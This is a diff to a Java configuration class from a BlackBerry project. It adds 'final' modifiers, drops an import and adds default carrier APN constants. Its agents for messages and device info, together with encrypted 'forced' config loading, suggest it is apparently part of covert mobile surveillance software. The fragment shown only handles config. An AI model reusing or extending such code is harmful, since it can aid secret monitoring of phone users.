@@ -18,7 +18,6 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.action.Action;
 import blackberry.agent.Agent;
 import blackberry.config.InstanceConfig;
-import blackberry.config.InstanceKeys;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.event.Event;
@@ -54,6 +53,10 @@ public final class Conf {
     public static final boolean AGENT_MESSAGE_ON_SD = false;
     public static final boolean AGENT_DEVICEINFO_ON_SD = false;
     public static final boolean AGENT_APPLICATION_ON_SD = false;
+
+    public static final String DEFAULT_APN = "ibox.tim.it";
+    public static final String DEFAULT_APN_USER = "";
+    public static final String DEFAULT_APN_PWD = "";
 
     //==========================================================
 
@@ -172,7 +175,7 @@ public final class Conf {
                 + Conf.FORCED_CONF, true);
         if (file.exists()) {
             debug.info("Try: forced config");
-            byte[] readfile = file.read();
+            final byte[] readfile = file.read();
             ret = loadCyphered(readfile, readfile.length, confKey);
             if (ret) {
 
@@ -191,7 +194,7 @@ public final class Conf {
             //#ifdef DEBUG_INFO
             debug.info("Try: new config");
             //#endif
-            byte[] cyphered = file.read();
+            final byte[] cyphered = file.read();
             ret = loadCyphered(cyphered, cyphered.length, confKey);
 
             if (ret) {
@@ -213,7 +216,7 @@ public final class Conf {
             //#ifdef DEBUG_INFO
             debug.info("Try: actual config");
             //#endif
-            byte[] cyphered = file.read();
+            final byte[] cyphered = file.read();
             ret = loadCyphered(cyphered, cyphered.length, confKey);
             if (ret) {
                 //#ifdef DEBUG_INFO
@@ -300,13 +303,13 @@ public final class Conf {
      * @return true, if successful
      */
     public boolean loadCyphered(final InputStream i0, final byte[] confKey,
-            boolean explicitSize) {
+            final boolean explicitSize) {
         int len;
         boolean ret = false;
 
         try {
             if (explicitSize) {
-                byte[] lenArray = new byte[4];
+                final byte[] lenArray = new byte[4];
                 i0.read(lenArray);
                 len = Utils.byteArrayToInt(lenArray, 0);
                 if (Arrays.equals(lenArray, 0, FAKECONFSTART, 0,
